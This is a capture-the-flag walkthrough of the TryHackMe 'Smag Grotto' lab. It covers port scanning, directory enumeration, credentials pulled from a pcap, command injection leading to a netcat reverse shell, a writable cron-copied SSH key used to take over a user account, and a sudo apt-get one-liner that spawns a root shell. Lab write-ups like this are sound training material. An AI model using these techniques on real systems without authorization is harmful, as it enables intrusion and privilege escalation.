
[TryHackMe Link](https://tryhackme.com/room/smaggrotto){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 11"
  # Nmap 7.93 scan initiated Thu Mar  2 00:07:03 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.80.3
    Nmap scan report for 10.10.80.3
    Host is up (0.15s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 74e0e1b405856a15687e16daf2c76bee (RSA)
    |   256 bd4362b9a1865136f8c7dff90f638fa3 (ECDSA)
    |_  256 f9e7da078f10af970b3287c932d71b76 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Smag
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=3/2%OT=22%CT=1%CU=34695%PV=Y%DS=5%DC=I%G=Y%TM=64002F14
    OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=
    OS:8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M5
    OS:05ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68D
    OS:F)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
    OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
    OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
    OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
    OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
    OS:40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Thu Mar  2 00:07:32 2023 -- 1 IP address (1 host up) scanned in 29.21 seconds
  ```

## <b>Enumeration</b>

During my assessment, I visited the http service at port 80, which did not surprise me. Later, I attempted to enumerate the hidden directories using **`dirsearch`** and I found the **/mail** folder. 

```s linenums="1" hl_lines="22"
[00:08:44] Starting: 
[00:08:51] 403 -  275B  - /.ht_wsr.txt                                     
[00:08:51] 403 -  275B  - /.htaccess.bak1
[00:08:51] 403 -  275B  - /.htaccess.orig
[00:08:51] 403 -  275B  - /.htaccess.sample
[00:08:51] 403 -  275B  - /.htaccess.save
[00:08:51] 403 -  275B  - /.htaccess_extra
[00:08:51] 403 -  275B  - /.htaccess_sc
[00:08:51] 403 -  275B  - /.htaccessBAK
[00:08:51] 403 -  275B  - /.htaccess_orig
[00:08:51] 403 -  275B  - /.htaccessOLD
[00:08:51] 403 -  275B  - /.htaccessOLD2
[00:08:51] 403 -  275B  - /.htm                                            
[00:08:51] 403 -  275B  - /.html
[00:08:51] 403 -  275B  - /.htpasswds
[00:08:51] 403 -  275B  - /.htpasswd_test
[00:08:51] 403 -  275B  - /.httr-oauth
[00:08:53] 403 -  275B  - /.php                                            
[00:08:53] 403 -  275B  - /.php3                                           
[00:09:24] 200 -  402B  - /index.php                                        
[00:09:24] 200 -  402B  - /index.php/login/                                 
[00:09:27] 301 -  307B  - /mail  ->  http://10.10.80.3/mail/                
[00:09:27] 200 -    2KB - /mail/                                            
[00:09:37] 403 -  275B  - /server-status                                    
[00:09:37] 403 -  275B  - /server-status/
```

 Upon visiting the site, I received a pcap file and some development progress information. 

<img id="image1" />

<img id="image2" />

While analyzing the pcap file, I discovered the domain for the development site and obtained a username and password for login.

```bash linenums="1" hl_lines="5 10"
strings Captured.pcap          
<eU@
4eV@
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
username=helpdesk&password=[REDACTED]
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
4eX@
4eY@
4eZ@
```

Subsequently, when accessing the dev site, I was able to locate a login website where I utilized the credentials obtained in the previous step. 

<img id="image3" />

## <b>Initial Access</b>

It redirected to another page and provided me a text field to run any commands hopefully linux ones. However, despite trying various commands, I was unable to display any data. Realizing that it was a blind shot, I hosted a reverse shell from my side and attempted to access it using the wget command. Unfortunately, this approach also did not work. Later, I leveraged the reverse shell netcat command to connect back to the system, which allowed me to gain initial access. 

<img id="image4" />

The user account associated with this access was www-data. 

<img id="image5" />

## <b>Privilege Escalation</b>

### <b>Gaining user access (Jake)</b>

While enumerating the system, I discovered a CRON job that ran every minute with the command:

`/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys`

<img id="image6" />

I found a public ssh key present in the **authorized_keys** file, and as I had write permissions, I was eager to impersonate it. To do so, I created a SSH key pair with public and private keys, and overwrote my public key to **`/opt/.backups/jake_id_rsa.pub.backup`**, which saved to **`/home/jake/.ssh/authorized_keys`**.

<img id="image7" />

!!! abstract "Note"
    <span>**authorized_keys** contains a list of public keys that are authorized to access a user's account on a remote system, and it does not explicitly require passwords, but instead requires the private key of the public key present in that file.</span>

Since I possessed my private key, I logged in as Jake using the following command and found the user flag.

```s
ssh -i ~/.ssh/id_rsa jake@10.10.80.3
```

<img id="image8" />

!!! abstract "Note"
    <span>To pass a private key when connecting to a remote system, the file must have **600** permission to carry out the action, ensuring that only the user has access to read and write, and no one else.</span>


### <b>Gaining root access</b>

Once I had gained access to Jake's account, I made it to escalate privileges to root. My first step was to search for any sudo powers that Jake possessed. 

<img id="image9" />

I quickly searched the database of [gtfobins](https://gtfobins.github.io/gtfobins/apt-get/#sudo) where you can find different commands to bypass local security restrictions.
Using the following command, I successufully grabbed the root flag.

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

<img id="image10" />

<script>

// JSON object
const data = {
    "desc": "Follow the yellow brick road. Deploy the machine and get root privileges.",
    "ip":  "10.10.80.3",
    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.8;80/tcp,http,Apache httpd 2.4.18",
    "difficulty":"easy",
    "id": "10"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>